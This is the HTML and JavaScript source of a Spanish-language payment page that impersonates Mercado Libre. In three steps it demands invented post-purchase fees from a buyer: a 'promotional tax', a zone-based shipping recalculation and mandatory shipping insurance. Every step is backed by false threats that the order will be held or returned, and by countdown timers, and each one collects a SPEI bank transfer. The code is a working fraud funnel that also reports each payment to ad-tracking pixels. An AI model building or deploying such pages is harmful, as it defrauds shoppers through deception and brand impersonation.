<!DOCTYPE html>
<html lang="es-MX">
<head>

<script src="/js/api-base.js"></script>
<script src="/js/fb-pixel.js"></script><script src="/js/tiktok-pixel.js"></script>
<script src="/js/utmify-pixel.js"></script><script src="/js/visit-log.js" defer></script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Regularización de tu pedido — Mercado Libre</title>
<meta name="robots" content="noindex, nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',system-ui,sans-serif}
  body{background:#f4f7f6;color:#1a1a1a;min-height:100vh}
  input,select,textarea{font-size:16px}
  header{background:#fff;border-bottom:1px solid #e8ecea;padding:12px 14px;display:flex;align-items:center;justify-content:space-between}
  header img{height:22px}
  header .etapa{font-size:11px;color:#0f9c74;font-weight:800;letter-spacing:.4px}
  .prog{height:4px;background:#e5e7eb}
  .prog>div{height:100%;background:#3483FA;transition:width .4s}
  .wrap{max-width:560px;margin:0 auto;padding:16px 14px 40px}
  .card{background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.07);padding:20px;margin-bottom:16px}
  .badge{display:inline-block;color:#fff;font-size:11px;font-weight:800;padding:5px 10px;border-radius:5px;letter-spacing:.6px}
  h1{font-size:22px;font-weight:800;margin:12px 0 8px;line-height:1.25;color:#232323}
  .sub{font-size:14px;color:#DC2626;font-weight:700;margin-bottom:16px}
  .exp{background:#F0FBF7;border:1px solid #CDEFE3;border-radius:10px;padding:12px;margin-bottom:14px;font-size:13px;color:#1c4c3d;line-height:1.55}
  ul.b{list-style:none;margin:0 0 16px;font-size:13px;color:#333}
  ul.b li{display:flex;gap:8px;align-items:flex-start;padding:6px 0;border-bottom:1px dashed #eee}
  ul.b li:last-child{border-bottom:0}
  ul.b span.c{color:#12b886;font-weight:800;flex-shrink:0}
  .avs{background:#FFF6F6;border-left:3px solid #DC2626;padding:10px 12px;margin-bottom:16px;font-size:12px;color:#7F1D1D;line-height:1.5}
  .val{display:flex;align-items:baseline;justify-content:space-between;background:#F0FBF7;border:1px solid #CDEFE3;padding:12px 14px;border-radius:10px;margin-bottom:14px}
  .val .lb{font-size:12px;color:#0f9c74;font-weight:700}
  .val .vv{font-size:26px;font-weight:800;color:#0f9c74}
  .btn{width:100%;padding:15px;background:#3483FA;color:#fff;border:0;border-radius:10px;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit}
  .btn:disabled{opacity:.7;cursor:wait}
  .pular{display:block;margin:12px auto 0;background:transparent;border:0;color:#999;font-size:12px;text-decoration:underline;cursor:pointer}
  .pix-box{text-align:center}
  .pix-timer{font-size:30px;font-weight:800;color:#0f9c74;font-variant-numeric:tabular-nums;margin:4px 0 12px}
  .pix-timer.red{color:#DC2626;animation:bl 1s ease-in-out infinite}
  @keyframes bl{0%,100%{opacity:1}50%{opacity:.35}}
  .qr-img{width:200px;height:200px;border:1px solid #e8ecea;border-radius:10px;padding:6px;background:#fff}
  .cp-code{background:#F9FAFB;border:1px solid #E5E7EB;border-radius:8px;padding:10px;font-size:11px;color:#374151;word-break:break-all;font-family:monospace;margin:12px 0 10px;max-height:90px;overflow:hidden;text-align:left}
  .cp-btn{width:100%;padding:13px;background:#0f9c74;color:#fff;border:0;border-radius:10px;font-size:14px;font-weight:800;cursor:pointer;font-family:inherit}
  .cp-btn.ok{background:#059669}
  .wait{margin-top:14px;padding:10px;background:#F0FBF7;border-radius:8px;font-size:12px;color:#1c4c3d;line-height:1.5;text-align:center}
  .paid{text-align:center;padding:20px 0}
  .paid .ci{width:72px;height:72px;background:#D1FAE5;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:36px}
  .paid .ok{font-size:20px;font-weight:800;color:#059669;margin-bottom:8px}
  .err{text-align:center;padding:10px 0}
  .foot{text-align:center;font-size:11px;color:#9CA3AF;line-height:1.7}
  .hidden{display:none}
  .comp-up{background:#fff;border:1px dashed #cfd8dc;border-radius:10px;padding:14px;margin-top:14px;text-align:center}
  .comp-up p{font-size:13px;color:#303235;margin-bottom:8px;line-height:1.5}
  .comp-up strong{color:#0f9c74}
  .comp-up label{display:inline-block;background:#F0FBF7;color:#0f9c74;border:1px solid #CDEFE3;padding:8px 14px;border-radius:8px;font-weight:700;font-size:13px;cursor:pointer}
  .comp-up input[type=file]{display:none}
  .comp-up .status{margin-top:8px;font-size:12px;font-weight:600}
</style>
</head>
<body>
<header>
  <img src="/quiz/images/logo.webp" alt="celimax">
  <div class="etapa" id="etapa">PASO 1 DE 3</div>
</header>
<div class="prog"><div id="progbar" style="width:33%"></div></div>
<div class="wrap">
  <div class="card" id="card"></div>
  <div class="foot">Procesamiento seguro vía SPEI<br>Pago procesado de forma segura</div>
</div>
<script>
const STEPS = {
  '1': {
    key: 'IMP-PROM',
    amount: 9900,
    badge: 'PENDIENTE FISCAL EN TU PEDIDO',
    badgeColor: '#DC2626',
    titulo: 'Tasa de Impuesto Promocional (TIP)',
    subtitulo: 'Pago obligatorio para la emisión de la factura de tu pedido.',
    explicacao: 'Tu pago fue aprobado, pero el sistema identificó la incidencia de la Tasa de Impuesto Promocional — tributo aplicado sobre productos vendidos en campaña promocional. Sin este pago, la factura de tu pedido no se emite y la mercancía queda retenida en el centro de distribución.',
    bullets: [
      'Tasa promocional reducida, cobrada por única vez sobre el pedido.',
      'Tras el pago, la factura se emite automáticamente en minutos.',
      'El comprobante queda archivado junto a tu pedido para cualquier revisión fiscal.',
    ],
    aviso: 'Si el impuesto no es pagado, el pedido queda retenido en el centro de distribución y se devuelve al remitente en un plazo de hasta 72 horas.',
    ctaLabel: 'Pagar impuesto promocional - $99',
    next: '2',
    msgSucesso: '¡Impuesto pagado — factura emitida!'
  },
  '2': {
    key: 'FRETE-REC',
    amount: 6900,
    badge: 'RECÁLCULO DE ENVÍO NECESARIO',
    badgeColor: '#0f9c74',
    titulo: 'Recálculo de Envío por Zona',
    subtitulo: 'Cargo adicional obligatorio para que la paquetería acepte la entrega.',
    explicacao: 'Al generar la guía de envío, la paquetería recalculó el costo con base en el código postal proporcionado e identificó una diferencia por zona de cobertura extendida. Este pago adicional debe liquidarse para que la guía sea aceptada y tu pedido continúe en ruta de entrega.',
    bullets: [
      'Diferencia de envío calculada directamente por la paquetería, sin comisión de la tienda.',
      'Tras realizar el pago, se genera la guía y se activa el número de rastreo el mismo día.',
      'Garantiza la entrega en la dirección indicada, sin desvíos a sucursales.',
    ],
    aviso: 'Sin el pago adicional de envío, la guía se cancela y el pedido regresa a la fila de preparación, con fecha de entrega indefinida.',
    ctaLabel: 'Pagar recálculo de envío - $69',
    next: '3',
    msgSucesso: '¡Envío pagado — guía de envío generada!'
  },
  '3': {
    key: 'SEG-ENVIO',
    amount: 4900,
    badge: 'ÚLTIMA ETAPA - SEGURO DE ENVÍO',
    badgeColor: '#12b886',
    titulo: 'Tarifa Obligatoria de Seguro de Envío',
    subtitulo: 'Último paso para liberar tu pedido y enviarlo hoy mismo.',
    explicacao: 'Los productos se envían en paquete sellado con seguro obligatorio contra extravío, violación y daños. Esta tarifa cubre el seguro de transporte y libera tu pedido para el despacho prioritario de hoy. Sin ella, el pedido pasa a la fila normal de envío.',
    bullets: [
      'Cobertura total contra extravío, violación y daños durante el transporte.',
      'Reenvío gratis ante cualquier inconveniente en la entrega.',
      'Habilita el envío prioritario hoy mismo, en lugar de 3 a 5 días hábiles.',
    ],
    aviso: 'El despacho prioritario solo está disponible hoy. Sin el seguro, el pedido se procesa sin cobertura y en la fila normal de envío.',
    ctaLabel: 'Activar seguro de envío - $49',
    next: 'sucesso',
    msgSucesso: '¡Seguro activado — pedido liberado para envío!',
    permitirPular: true
  }
};

const params = new URLSearchParams(location.search);
const step = params.get('step') || '1';
const cfg = STEPS[step] || STEPS['1'];
document.getElementById('etapa').textContent = 'ETAPA ' + step + ' DE 3';
document.getElementById('progbar').style.width = (parseInt(step, 10) / 3 * 100) + '%';

const nome = params.get('nome') || params.get('name') || 'Cliente';
const primeiroNome = nome.trim().split(/\s+/)[0] || 'Cliente';
const cpfRaw = (params.get('cpf') || '').replace(/\D/g, '') || '00000000000';
const emailParam = params.get('email') || (nome.toLowerCase().replace(/[^a-z0-9]+/g, '.') + '@gmail.com');
const phoneParam = (params.get('phone') || '11999999999').replace(/\D/g, '');

const card = document.getElementById('card');
function fmtBRL(c){return '$' + (c/100).toLocaleString('es-MX',{maximumFractionDigits:0}) + ' MXN'}

function renderIntro(){
  card.innerHTML = `
    <div class="badge" style="background:${cfg.badgeColor}">${cfg.badge}</div>
    <h1>${cfg.titulo}</h1>
    <div class="sub">${cfg.subtitulo}</div>
    <div class="exp"><strong>¡Hola, ${primeiroNome}!</strong><br>${cfg.explicacao}</div>
    <ul class="b">${cfg.bullets.map(b=>`<li><span class="c">✓</span><span>${b}</span></li>`).join('')}</ul>
    <div class="avs">⚠️ <strong>Atención:</strong> ${cfg.aviso}</div>
    <div class="val"><div class="lb">Total a pagar por SPEI:</div><div class="vv">${fmtBRL(cfg.amount)}</div></div>
    <button class="btn" id="btn-go">${cfg.ctaLabel}</button>
    ${cfg.permitirPular ? '<button class="pular" id="btn-skip">No deseo continuar con este paso</button>' : ''}
  `;
  document.getElementById('btn-go').addEventListener('click', gerarPix);
  const sk = document.getElementById('btn-skip');
  if (sk) sk.addEventListener('click', avancar);
  // Upsell nao dispara InitiateCheckout: e etapa pos-compra e inflava o evento
  // (ate 3 eventos extras por comprador) acima do numero de cliques do anuncio.

}

function avancar(){
  const p = new URLSearchParams(location.search);
  if (cfg.next === 'sucesso') { location.href = '/celimax/obrigado.html'; return; }
  p.set('step', cfg.next);
  location.href = '/celimax/upsell.html?' + p.toString();
}

let seconds = 15*60, tickInt=null, pollInt=null;
function stopAll(){ if(tickInt) clearInterval(tickInt); if(pollInt) clearInterval(pollInt); tickInt=null; pollInt=null; }

async function gerarPix(){
  const btn = document.getElementById('btn-go');
  btn.disabled = true; btn.textContent = 'Generando SPEI...';
  try {
    const res = await fetch('/api/public/freepay-checkout', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        amount: cfg.amount,
        productName: cfg.titulo,
        isUpsell: true,
        method: 'spei',
        customer: {
          name: nome,
          email: emailParam,
          phone: phoneParam,
          
        },
        items: [{ name: cfg.titulo, price: cfg.amount/100, quantity: 1 }],
        tracking: Object.assign({}, (window.getStoredUtms ? window.getStoredUtms() : {}), (window.fbTracking ? window.fbTracking() : {}))
      })
    });
    const j = await res.json();
    const d = j?.data || {};
    if (!res.ok || !d.clabe) throw new Error(j?.error || 'No pudimos generar tu pago');
    renderPix(d, d.clabe, d.id);
  } catch(e) {
    card.innerHTML = `<div class="err"><div style="font-size:40px;margin-bottom:12px">❌</div><div style="font-size:16px;font-weight:700;color:#DC2626;margin-bottom:8px">No pudimos generar tu pago</div><div style="font-size:13px;color:#666;margin-bottom:16px">${e.message||''}</div><button class="btn" onclick="location.reload()">Intentar de nuevo</button></div>`;
  }
}

function renderPix(qr, copyPaste, txId){
  card.innerHTML = `
    <div class="pix-box">
      <div class="badge" style="background:#FEF3C7;color:#78350F">PAGO PENDIENTE</div>
      <div style="font-size:15px;font-weight:700;margin-top:10px">Transfiere por SPEI en los próximos</div>
      <div class="pix-timer" id="timer">15:00</div>
      <div style="font-size:13px;color:#444;margin:6px 0">Monto exacto: <strong>${fmtBRL(cfg.amount)}</strong></div>
      <div style="font-size:12px;color:#666;margin-top:8px">CLABE interbancaria</div>
      <div class="cp-code" style="font-size:18px;font-weight:700;letter-spacing:1px">${copyPaste}</div>
      <div style="font-size:12px;color:#666;margin-top:6px">Banco: <strong>${qr.bank_name||'STP'}</strong> · Beneficiario: <strong>${qr.beneficiary||''}</strong></div>
      <button class="cp-btn" id="cp-btn">Copiar CLABE</button>
      <div style="text-align:left;font-size:12.5px;color:#444;margin-top:10px;line-height:1.5">1. Copia la CLABE.<br>2. Abre la app de tu banco y elige <strong>Transferir</strong>.<br>3. Agrega la CLABE y envía el monto exacto.<br>4. Se confirma automáticamente en minutos.</div>
      <div class="wait">Esperando la confirmación de tu pago... No cierres esta página.</div>
      <div class="comp-up hidden" id="comp-up">
        <p><strong>¿Ya pagaste y sigues en esta página?</strong><br>Adjunta tu comprobante aquí abajo</p>
        <label for="comp-file">📎 Adjuntar comprobante</label>
        <input type="file" id="comp-file" accept="image/*,application/pdf">
        <div class="status" id="comp-status"></div>
      </div>
    </div>
  `;
  document.getElementById('cp-btn').addEventListener('click', () => copyPix(copyPaste));
  tickInt = setInterval(() => {
    seconds--;
    const mm = String(Math.floor(seconds/60)).padStart(2,'0');
    const ss = String(seconds%60).padStart(2,'0');
    const t = document.getElementById('timer');
    if (t) { t.textContent = mm+':'+ss; if(seconds<120) t.classList.add('red'); }
    if (seconds <= 0) stopAll();
  }, 1000);

  setTimeout(() => {
    const up = document.getElementById('comp-up');
    if (up) up.classList.remove('hidden');
    const fi = document.getElementById('comp-file');
    if (fi) fi.addEventListener('change', (e) => enviarComp(e, txId));
  }, 60000);

  pollInt = setInterval(async () => {
    try {
      const r = await fetch('/api/public/payment-status?transaction_id=' + encodeURIComponent(txId));
      const j = await r.json();
      if (j?.status === 'paid' || j?.status === 'approved') {
        stopAll();
        try {
          if (window.fbPurchase) window.fbPurchase(cfg.amount/100, txId);
          if (window.ttPurchase) window.ttPurchase(cfg.amount/100, txId);
          if (window.gadsPurchase) window.gadsPurchase(cfg.amount/100, txId);
        } catch(e){}
        renderPaid(txId);
      }
    } catch(e){}
  }, 5000);
}

function copyPix(text){
  const btn = document.getElementById('cp-btn');
  const done = () => { btn.textContent = '✓ ¡Copiado!'; btn.classList.add('ok'); setTimeout(()=>{btn.textContent='Copiar CLABE';btn.classList.remove('ok');},2000); };
  function fb(){ const ta=document.createElement('textarea');ta.value=text;ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');done();}catch(e){}ta.remove(); }
  if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done).catch(fb);
  else fb();
}

async function enviarComp(e, txId){
  const f = e.target.files && e.target.files[0]; if (!f) return;
  const st = document.getElementById('comp-status');
  st.textContent = 'Enviando comprobante...'; st.style.color = '#0f9c74';
  const fd = new FormData(); fd.append('file', f); fd.append('transaction_id', String(txId));
  try {
    const r = await fetch('/api/public/upload-comprovante', { method:'POST', body: fd });
    const j = await r.json();
    if (j?.success) { st.textContent='✓ ¡Comprobante enviado! Nuestro equipo ya fue notificado.'; st.style.color='#059669'; }
    else { st.textContent='Error al enviar: '+(j?.message||'intenta de nuevo'); st.style.color='#c0392b'; }
  } catch(err) { st.textContent='Error de conexión, intenta de nuevo.'; st.style.color='#c0392b'; }
}

function renderPaid(txId){
  card.innerHTML = `
    <div class="paid">
      <div class="ci">✅</div>
      <div class="ok">${cfg.msgSucesso}</div>
      <div style="font-size:13px;color:#555;line-height:1.6">Protocolo: <strong>${txId||'—'}</strong><br>Redirecionando...</div>
    </div>
  `;
  setTimeout(avancar, 2500);
}

renderIntro();
</script>
</body>
</html>
